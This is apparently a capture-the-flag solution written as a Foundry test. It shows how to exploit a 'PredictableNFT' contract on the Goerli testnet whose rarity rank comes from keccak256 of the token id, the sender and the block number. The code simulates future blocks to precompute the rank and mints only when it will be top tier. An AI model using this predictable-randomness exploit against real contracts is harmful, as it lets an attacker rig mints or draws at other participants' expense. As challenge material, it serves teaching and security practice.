// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

interface IPredictableNFT {
    function mint() external payable returns(uint256);
	function id() external returns(uint256);
}

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);
	IPredictableNFT nftContract;

	function setUp() public {
		vm.createSelectFork("goerli");
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
		
		nftContract = IPredictableNFT(nft);
	}

	function test() public {
		vm.startPrank(hacker);
		uint mintedId;
		uint currentBlockNum = block.number;
		uint nftId = 2;

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// ---- hacking time ----


			bytes32 rankHash = keccak256(abi.encode(nftId, hacker, currentBlockNum));
			uint256 nftRank = uint256(rankHash) % 100;

			if(nftRank > 90){
				mintedId = nftContract.mint{value: 1 ether}(); 
				break;
			}

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}